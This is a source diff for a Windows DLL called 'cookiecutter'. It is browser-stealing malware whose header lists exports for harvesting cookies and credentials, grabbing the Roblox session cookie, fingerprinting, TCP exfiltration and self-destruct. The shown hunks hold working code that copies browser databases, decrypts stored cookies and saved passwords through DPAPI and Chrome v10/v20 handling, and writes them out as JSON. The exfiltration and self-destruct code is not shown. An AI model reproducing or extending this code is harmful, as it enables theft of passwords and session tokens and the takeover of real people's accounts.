@@ -1,5 +1,7 @@
 //=============================================================================
-//  cookiecutter.cpp — Main DLL (clean, no debug)
+//  cookiecutter.cpp — Main DLL (clean, production build)
+//  Exports: HarvestCookies, HarvestCredentials, HarvestRobloxCookie,
+//           GetFingerprint, ExfilTCP, SelfDestruct, DPADecryptBlob
 //=============================================================================
 
 #include "cookiecutter.h"
@@ -45,7 +47,9 @@ namespace cookiecutter {
     bool DPADecrypt(const std::vector<uint8_t>& ct, std::vector<uint8_t>& pt) {
         if(ct.empty())return false;
         DATA_BLOB in={(DWORD)ct.size(),(BYTE*)ct.data()},out={0};
-        if(!CryptUnprotectData(&in,nullptr,nullptr,nullptr,nullptr,CRYPTPROTECT_UI_FORBIDDEN,&out))return false;
+        if(!CryptUnprotectData(&in,nullptr,nullptr,nullptr,nullptr,0,&out))
+            if(!CryptUnprotectData(&in,nullptr,nullptr,nullptr,nullptr,CRYPTPROTECT_UI_FORBIDDEN,&out))
+                return false;
         pt.assign(out.pbData,out.pbData+out.cbData); LocalFree(out.pbData); return true;
     }
     
@@ -74,11 +78,11 @@ namespace cookiecutter {
     }
 }
 
-// v20 helper (in chrome_v20.cpp)
+// v20 helper (chrome_v20.cpp)
 bool ChromeV20Decrypt(const std::wstring&,const std::vector<uint8_t>&,std::vector<uint8_t>&);
 
 // =========================================================================
-//  Exports
+//  HarvestCookies
 // =========================================================================
 
 extern "C" CC_API bool HarvestCookies(const wchar_t* out) {
@@ -103,18 +107,24 @@ extern "C" CC_API bool HarvestCookies(const wchar_t* out) {
             auto* ic=Database::getColumn(row,tab->columns,"is_httponly");ce.httpOnly=ic?(Database::asInt(*ic)!=0):false;
             const auto& blob=Database::asBlob(*ec);if(blob.empty())continue;
             std::vector<uint8_t> ct(blob);
-            bool hasPfx=(ct.size()>=4&&ct[0]=='v'&&ct[3]==0);
+            bool isV20=(ct.size()>=4&&ct[0]=='v'&&ct[1]=='2'&&ct[2]=='0');
+            bool isV10=(ct.size()>=4&&ct[0]=='v'&&ct[1]=='1'&&ct[2]=='0');
             std::vector<uint8_t> dec;
-            // v20 app-bound
-            if(bp.isChromium&&hasPfx&&!bp.localStatePath.empty()&&ChromeV20Decrypt(bp.localStatePath,blob,dec)){ce.value=std::string((const char*)dec.data(),dec.size());all.push_back(std::move(ce));continue;}
-            // DPAPI fallback (strip prefix)
-            if(hasPfx)ct.erase(ct.begin(),ct.begin()+4);
+            // v20 app-bound (admin required)
+            if(bp.isChromium&&isV20&&!bp.localStatePath.empty()&&ChromeV20Decrypt(bp.localStatePath,blob,dec)){ce.value=std::string((const char*)dec.data(),dec.size());all.push_back(std::move(ce));continue;}
+            // v10 DPAPI
+            if(isV10)ct.erase(ct.begin(),ct.begin()+4);
+            else if(isV20)continue; // can't decrypt v20 without admin
             if(cookiecutter::DPADecrypt(ct,dec)&&!dec.empty()){ce.value=std::string((const char*)dec.data(),dec.size());all.push_back(std::move(ce));}
         }
     }
     std::string js=cookiecutter::CookieJson(all);
     return cookiecutter::WriteToFile(out,js.data(),js.size());
 }
+
+// =========================================================================
+//  HarvestCredentials
+// =========================================================================
 
 extern "C" CC_API bool HarvestCredentials(const wchar_t* out) {
     BrowserProfile buf[64];int n=EnumerateBrowsers(buf,64);
@@ -134,13 +144,17 @@ extern "C" CC_API bool HarvestCredentials(const wchar_t* out) {
             if(!pc)pc=Database::getColumn(row,tab->columns,"encrypted_password");
             if(!uc||!un||!pc)continue;
             CredentialEntry c;c.url=Database::asText(*uc);c.username=Database::asText(*un);c.browser=cookiecutter::w2n(bp.name);
-            if(!Database::isNull(*pc)){const auto& blob=Database::asBlob(*pc);if(!blob.empty()){std::vector<uint8_t> ct(blob);if(ct.size()>=4&&ct[0]=='v'&&ct[3]==0)ct.erase(ct.begin(),ct.begin()+4);std::vector<uint8_t> d;if(cookiecutter::DPADecrypt(ct,d))c.password=std::string((const char*)d.data(),d.size());}}
+            if(!Database::isNull(*pc)){const auto& blob=Database::asBlob(*pc);if(!blob.empty()){std::vector<uint8_t> ct(blob);if(ct.size()>=4&&ct[0]=='v'&&ct[1]=='1'&&ct[2]=='0')ct.erase(ct.begin(),ct.begin()+4);std::vector<uint8_t> d;if(cookiecutter::DPADecrypt(ct,d))c.password=std::string((const char*)d.data(),d.size());}}
             all.push_back(std::move(c));
         }
     }
     std::string js=cookiecutter::CredJson(all);
     return cookiecutter::WriteToFile(out,js.data(),js.size());
 }
+
+// =========================================================================
+//  HarvestRobloxCookie
+// =========================================================================
 
 extern "C" CC_API bool HarvestRobloxCookie(char* out, size_t* sz) {
     if(!out||!sz||!*sz)return false;
@@ -153,7 +167,7 @@ extern "C" CC_API bool HarvestRobloxCookie(char* out, size_t* sz) {
         auto rows=db.readTable(tab->name,".roblox.com");DeleteFileW(tmp.c_str());
         for(auto& row:rows){auto* nc=Database::getColumn(row,tab->columns,"name");auto* ec=Database::getColumn(row,tab->columns,"encrypted_value");if(!nc||!ec||Database::asText(*nc)!=".ROBLOSECURITY"||Database::isNull(*ec))continue;
             const auto& blob=Database::asBlob(*ec);if(blob.empty())continue;
-            std::vector<uint8_t> ct(blob);if(ct.size()>=4&&ct[0]=='v'&&ct[3]==0)ct.erase(ct.begin(),ct.begin()+4);
+            std::vector<uint8_t> ct(blob);if(ct.size()>=4&&ct[0]=='v'&&ct[1]=='1'&&ct[2]=='0')ct.erase(ct.begin(),ct.begin()+4);
             std::vector<uint8_t> d;if(cookiecutter::DPADecrypt(ct,d)&&!d.empty()){std::string val((const char*)d.data(),d.size());size_t m=(std::min)(val.size(),*sz-1);memcpy(out,val.data(),m);out[m]=0;*sz=m;return true;}
         }
     }
